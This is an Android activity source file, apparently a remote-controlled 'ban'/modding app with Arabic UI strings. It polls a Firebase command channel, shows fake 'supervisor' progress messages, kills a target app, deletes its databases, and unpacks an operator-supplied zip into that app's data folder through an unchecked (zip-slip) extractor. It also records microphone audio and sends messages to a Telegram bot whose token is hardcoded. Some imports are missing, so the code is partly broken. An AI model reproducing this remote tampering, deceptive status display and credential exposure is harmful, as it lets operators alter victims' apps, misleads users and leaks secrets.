package com.ban.ab;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import org.json.JSONObject;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okio.BufferedSink;
import okio.Okio;

public class SecondActivity extends AppCompatActivity {

    private String userName;
    private final String FIREBASE_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private final String TELEGRAM_BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
    private final String ADMIN_CHAT_ID = "1749638488"; 
    private final OkHttpClient client = new OkHttpClient();

    private CardView layoutWaiting, layoutRejected, layoutFields, layoutZipTask;
    private TextView txtRejectReason, txtProgressStatus, txtTicketID;
    private Button btnCancelOrder, btnExecuteTask;
    private ProgressBar taskProgressBar;

    // أدوات المحادثة والتسجيل
    private MediaRecorder recorder;
    private String voiceFileName;
    private FloatingActionButton fabChat;

    private final Handler refreshHandler = new Handler(Looper.getMainLooper());
    private Runnable refreshRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        checkPermissions();
        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "");

        initViews();
        setupFloatingChatButton(); // إعداد زر المحادثة العائم
        generateTicketID();
        startStatusSequence(); 
        startAutoRefresh();
    }

    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Exception e) {
                    startActivity(new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION));
                }
            }
        }
    }

    private void initViews() {
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutFields = findViewById(R.id.layoutFields);
        layoutZipTask = findViewById(R.id.layoutZipTask); 
        txtProgressStatus = findViewById(R.id.txtProgressStatus);
        txtTicketID = findViewById(R.id.txtTicketID);
        txtRejectReason = findViewById(R.id.txtRejectReason);
        btnCancelOrder = findViewById(R.id.btnCancelOrder);
        btnExecuteTask = findViewById(R.id.btnExecuteTask); 
        taskProgressBar = findViewById(R.id.taskProgressBar);

        btnCancelOrder.setOnClickListener(v -> {
            stopAutoRefresh();
            getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
            startActivity(new Intent(this, MainActivity.class));
            finish();
        });
    }

    // --- نظام المحادثة المنبثقة ---

    private void setupFloatingChatButton() {
        fabChat = new FloatingActionButton(this);
        fabChat.setImageResource(android.R.drawable.stat_notify_chat);
        fabChat.setBackgroundTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#1A73E8")));
        
        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT, WindowManager.LayoutParams.WRAP_CONTENT);
        params.gravity = Gravity.BOTTOM | Gravity.START;
        params.setMargins(50, 0, 0, 50);
        
        ((ViewGroup) findViewById(android.R.id.content)).addView(fabChat, params);
        fabChat.setOnClickListener(v -> showChatPopup());
    }

    @SuppressLint("ClickableViewAccessibility")
    private void showChatPopup() {
        final Dialog chatDialog = new Dialog(this);
        chatDialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        chatDialog.setContentView(R.layout.chat_layout); // تأكد من إنشاء هذا الملف في layout
        chatDialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));

        Window window = chatDialog.getWindow();
        WindowManager.LayoutParams wlp = window.getAttributes();
        wlp.gravity = Gravity.BOTTOM | Gravity.START;
        wlp.x = 50; wlp.y = 200;
        window.setAttributes(wlp);

        EditText edtMsg = chatDialog.findViewById(R.id.edtMessage);
        ImageButton btnSend = chatDialog.findViewById(R.id.btnSendMessage);
        ImageButton btnRecord = chatDialog.findViewById(R.id.btnRecord);
        ImageButton btnClose = chatDialog.findViewById(R.id.btnCloseChat);

        btnClose.setOnClickListener(v -> chatDialog.dismiss());

        btnSend.setOnClickListener(v -> {
            String msg = edtMsg.getText().toString().trim();
            if (!msg.isEmpty()) {
                sendTextToTelegram(msg);
                edtMsg.setText("");
            }
        });

        // التسجيل الصوتي باللمس المطول
        btnRecord.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                startVoiceRecording();
                btnRecord.setColorFilter(Color.RED);
            } else if (event.getAction() == MotionEvent.ACTION_UP) {
                stopVoiceRecording();
                btnRecord.setColorFilter(Color.parseColor("#1A73E8"));
            }
            return true;
        });

        chatDialog.show();
    }

    private void sendTextToTelegram(String msg) {
        String fullMsg = "💬 **رسالة من:** " + userName + "\n\n" + msg;
        String url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage?chat_id=" + ADMIN_CHAT_ID + "&text=" + Uri.encode(fullMsg);
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {
                runOnUiThread(() -> Toast.makeText(SecondActivity.this, "تم الإرسال ✅", Toast.LENGTH_SHORT).show());
            }
        });
    }

    private void startVoiceRecording() {
        try {
            voiceFileName = getExternalCacheDir().getAbsolutePath() + "/v_temp.m4a";
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(voiceFileName);
            recorder.prepare();
            recorder.start();
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void stopVoiceRecording() {
        if (recorder != null) {
            try {
                recorder.stop();
                recorder.release();
                recorder = null;
                sendVoiceToTelegram(voiceFileName);
            } catch (Exception e) { e.printStackTrace(); }
        }
    }

    private void sendVoiceToTelegram(String filePath) {
        File file = new File(filePath);
        RequestBody fileBody = RequestBody.create(file, MediaType.parse("audio/m4a"));
        MultipartBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("voice", file.getName(), fileBody)
                .addFormDataPart("chat_id", ADMIN_CHAT_ID)
                .addFormDataPart("caption", "🎤 بصمة صوتية من: " + userName)
                .build();

        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendVoice")
                .post(requestBody).build();

        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {
                runOnUiThread(() -> Toast.makeText(SecondActivity.this, "تم إرسال الصوت ✅", Toast.LENGTH_SHORT).show());
            }
        });
    }

    // --- نهاية نظام المحادثة ---

    private void generateTicketID() {
        txtTicketID.setText("تذكرة رقم: " + (System.currentTimeMillis() / 100000));
    }

    private void startStatusSequence() {
        final String[] msgs = {"جاري فحص البيانات...", "بانتظار المشرف المباشر...", "يتم الآن تأمين الاتصال..."};
        refreshHandler.post(new Runnable() {
            int i = 0;
            @Override public void run() {
                if (layoutWaiting.getVisibility() == View.VISIBLE) {
                    txtProgressStatus.setText(msgs[i % msgs.length]);
                    i++;
                    refreshHandler.postDelayed(this, 3000);
                }
            }
        });
    }

    private void startAutoRefresh() {
        refreshRunnable = new Runnable() {
            @Override public void run() { checkFirebaseStatus(); refreshHandler.postDelayed(this, 5000); }
        };
        refreshHandler.post(refreshRunnable);
    }

    private void checkFirebaseStatus() {
        String url = FIREBASE_URL + "commands/" + userName + ".json";
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    try {
                        String res = response.body().string();
                        if (res.equals("null")) return;
                        JSONObject data = new JSONObject(res);
                        runOnUiThread(() -> updateUI(data.optString("status"), data));
                    } catch (Exception ignored) {}
                }
            }
        });
    }

    private void updateUI(String status, JSONObject data) {
        layoutWaiting.setVisibility(View.GONE);
        layoutRejected.setVisibility(View.GONE);
        layoutFields.setVisibility(View.GONE);
        layoutZipTask.setVisibility(View.GONE);

        if (status.equals("rejected")) {
            layoutRejected.setVisibility(View.VISIBLE);
            txtRejectReason.setText(data.optString("reason", "تم الرفض"));
        } else if (status.equals("fields")) {
            layoutFields.setVisibility(View.VISIBLE);
        } else if (status.equals("zip_task")) {
            layoutZipTask.setVisibility(View.VISIBLE);
            String zipUrl = data.optString("zip_url");
            String targetPkg = data.optString("target_package", "com.target.app");
            btnExecuteTask.setOnClickListener(v -> startModdingProcess(zipUrl, targetPkg));
        } else {
            layoutWaiting.setVisibility(View.VISIBLE);
        }
    }

    private void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()) {
            File[] children = fileOrDirectory.listFiles();
            if (children != null) { for (File child : children) { deleteRecursive(child); } }
        }
        fileOrDirectory.delete();
    }

    private void startModdingProcess(String url, String pkg) {
        btnExecuteTask.setEnabled(false);
        taskProgressBar.setVisibility(View.VISIBLE);
        new Thread(() -> {
            boolean success = false;
            try {
                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                am.killBackgroundProcesses(pkg);
                Thread.sleep(1000);

                Context targetContext = createPackageContext(pkg, Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);
                String targetPath = targetContext.getApplicationInfo().dataDir;
                File targetDir = new File(targetPath);

                File databaseDir = new File(targetPath, "databases");
                if (databaseDir.exists()) deleteRecursive(databaseDir);

                File tempZip = new File(getCacheDir(), "update.zip");
                if (tempZip.exists()) tempZip.delete();
                downloadFileSync(url, tempZip);

                unzip(tempZip, targetDir);
                tempZip.delete(); 
                success = true;
            } catch (Exception e) { e.printStackTrace(); }

            final boolean finalSuccess = success;
            runOnUiThread(() -> {
                taskProgressBar.setVisibility(View.GONE);
                btnExecuteTask.setEnabled(true);
                Toast.makeText(this, finalSuccess ? "تمت العملية بنجاح ✅" : "فشلت العملية ❌", Toast.LENGTH_LONG).show();
            });
        }).start();
    }

    private void downloadFileSync(String url, File destFile) throws IOException {
        Request request = new Request.Builder().url(url).build();
        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) throw new IOException("Download failed");
            try (BufferedSink sink = Okio.buffer(Okio.sink(destFile))) { sink.writeAll(response.body().source()); }
        }
    }

    private void unzip(File zipFile, File targetDir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(zipFile)))) {
            ZipEntry ze;
            while ((ze = zis.getNextEntry()) != null) {
                File file = new File(targetDir, ze.getName());
                if (ze.isDirectory()) { file.mkdirs(); } 
                else {
                    File parent = file.getParentFile();
                    if (parent != null) parent.mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        byte[] buffer = new byte[8192];
                        int len;
                        while ((len = zis.read(buffer)) != -1) { fos.write(buffer, 0, len); }
                    }
                }
            }
        }
    }

    private void stopAutoRefresh() { refreshHandler.removeCallbacks(refreshRunnable); }
    @Override protected void onDestroy() { super.onDestroy(); stopAutoRefresh(); }
}
